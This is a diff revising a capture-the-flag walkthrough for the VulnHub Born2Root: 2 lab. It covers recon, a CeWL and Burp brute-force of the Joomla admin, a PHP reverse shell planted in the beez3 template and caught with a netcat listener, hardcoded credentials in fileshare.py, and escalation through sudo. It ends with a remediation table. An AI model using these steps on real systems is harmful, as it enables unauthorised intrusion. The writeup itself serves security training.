@@ -1,96 +1,102 @@
 # Born2Root: 2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.9 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.9 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | `/root/flag.txt` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/born2root-2,) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/born2root-2-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`nmap` → Joomla on `/joomla/` (CeWL wordlist + Burp brute) → PHP reverse shell via template editor → `/opt/scripts/fileshare.py` creds → `su tim` → `sudo su` → root
+Born2Root: 2 is a Joomla-based machine. Directory brute-forcing reveals a Joomla CMS. A custom wordlist built with CeWL from the site is used to brute-force the Joomla admin panel via Burp Suite, yielding `admin:travel`. A PHP reverse shell is planted in a Joomla template. Post-exploitation enumeration finds credentials for user `tim` in a local Python script. Tim has broad `sudo` rights, granting a trivial root shell.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Directory brute-force reveals Joomla installation
-3. CeWL wordlist generation + Burp Suite brute-force
-4. Joomla admin access → PHP reverse shell via beez3 template
-5. Credential discovery in `/opt/scripts/fileshare.py`
-6. `sudo -l` → full sudo rights → root
+1. Network enumeration
+2. Directory brute-forcing with dirb
+3. Wordlist generation with CeWL
+4. Joomla admin brute-force with Burp Suite
+5. PHP reverse shell via Joomla template editor
+6. Credential discovery in a local script
+7. Sudo privilege escalation
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -A 192.168.1.9
+netdiscover
+nmap -A $TARGET
 ```
 
-Open ports:
+![nmap](images/01-nmap.png)
+
+**Open ports:**
 - 22/tcp — SSH
-- 88/tcp — HTTP (Joomla)
+- 80/tcp — HTTP (Joomla CMS)
 - 111/tcp — RPC
 
-![Nmap scan](images/01-nmap.png)
+The main web page appears generic. Directory brute-forcing is required to find the CMS.
 
 ---
 
 ## Step 2: Web Enumeration
 
 ```bash
-dirb http://192.168.1.9/
+dirb http://$TARGET/
 ```
 
-`dirb` reveals `/joomla/`. Browsing the site shows "Tim's Blog", suggesting the username `tim`.
+![dirb](images/02-dirb.png)
 
-![Joomla admin panel](images/02-joomla.png)
+`dirb` reveals a Joomla installation under `/joomla`. The blog inside Joomla is titled "Tim's Blog," hinting at the username `tim`.
 
 ---
 
-## Step 3: Credential Attack
+## Step 3: Wordlist Generation and Brute-Force
 
-Generate a wordlist from the Joomla site content:
+Build a custom wordlist from the Joomla site's content:
 
 ```bash
-cewl http://192.168.1.9/joomla/ > dict.txt
+cewl http://$TARGET/joomla/ > dict.txt
 ```
 
-Brute-force the Joomla admin login with Burp Suite Intruder (username: `admin`, wordlist: `dict.txt`).
+Use Burp Suite Intruder to brute-force the Joomla admin login at `http://$TARGET/joomla/administrator/`:
+
+- Username: `admin` (default)
+- Password list: `dict.txt`
+
+![burp-brute](images/03-burp-brute.png)
 
 **Credentials found:** `admin` / `travel`
 
 ---
 
-## Step 4: PHP Reverse Shell
+## Step 4: Joomla Template PHP Reverse Shell
 
-Log in to Joomla admin at `http://192.168.1.9/joomla/administrator/`. Navigate to:
-**Extensions → Templates → Beez3 → index.php**
-
-Replace `index.php` with a PHP reverse shell (PentestMonkey), set LHOST/LPORT, save.
-
-Start a listener:
+1. Log in to `http://$TARGET/joomla/administrator/` as `admin:travel`.
+2. Navigate to **Extensions → Templates → Templates → beez3 → index.php**.
+3. Replace the entire contents with a PHP reverse shell (e.g., from `/usr/share/webshells/php/php-reverse-shell.php`), setting `$ip` to your attacker IP and `$port` to `1234`.
+4. Save the file.
 
 ```bash
-nc -lvp 1234
+nc -lvnp 1234
 ```
 
-Trigger the shell by visiting `http://192.168.1.9/joomla/templates/beez3/index.php`.
-
-Upgrade the TTY:
+Browse to `http://$TARGET/joomla/templates/beez3/index.php` to trigger the shell.
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Reverse shell](images/03-shell.png)
+![reverse-shell](images/04-reverse-shell.png)
 
 ---
 
-## Step 5: Credential Discovery
+## Step 5: Post-Exploitation — Credential Discovery
+
+Enumerate local scripts and configuration files:
 
 ```bash
 cd /opt
@@ -100,43 +106,53 @@ ls
 cat fileshare.py
 ```
 
-The file contains hardcoded credentials: **`tim` / `lulzlol`**
+`fileshare.py` contains hardcoded credentials for user `tim`:
+
+- **Username:** `tim`
+- **Password:** `lulzlol`
+
+![creds](images/05-creds.png)
 
 ---
 
-## Step 6: Privilege Escalation
+## Step 6: Privilege Escalation via Sudo
+
+Switch to `tim` and check sudo rights:
 
 ```bash
 su tim
-# password: lulzlol
+# Password: lulzlol
 sudo -l
 ```
 
-Output shows: `(ALL : ALL) ALL` — tim has full sudo rights.
+`tim` has broad `sudo` permissions. Escalate to root:
 
 ```bash
 sudo su
+```
+
+```bash
 cd /root
 ls
 cat flag.txt
 ```
 
-![Root flag](images/05-root.png)
+![root-flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **CeWL wordlist attack** — site-specific password lists dramatically increase brute-force success
-2. **Joomla template editor** provides direct PHP execution — protect admin panel with 2FA and strong passwords
-3. **Hardcoded credentials** in scripts (`fileshare.py`) are a critical misconfiguration
-4. **Excessive sudo rights** (`sudo su` without password) equals direct root access
+1. Default Joomla credentials and CMS admin panels should never be internet-facing without multi-factor authentication.
+2. CeWL wordlists derived from a target site are highly effective against site-specific passwords.
+3. Hardcoded credentials in application scripts are a critical vulnerability — use environment variables or a secrets manager.
+4. Over-permissive `sudo` rules grant an unprivileged user a trivial path to root.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Weak Joomla admin password | Enforce strong passwords; enable 2FA |
-| PHP code execution via template editor | Restrict template editing to trusted admins only |
-| Hardcoded credentials in scripts | Use environment variables or a secrets manager |
-| Full sudo rights | Apply principle of least privilege; restrict sudo to specific commands |
+| Weak Joomla Admin Password | Enforce strong passwords; enable MFA on the admin panel |
+| PHP File Upload / Template Edit | Restrict template editing to the filesystem; disable web-based editor in production |
+| Hardcoded Credentials | Use environment variables or a vault for all secrets |
+| Over-permissive Sudo | Apply principle of least privilege; audit `/etc/sudoers` regularly |
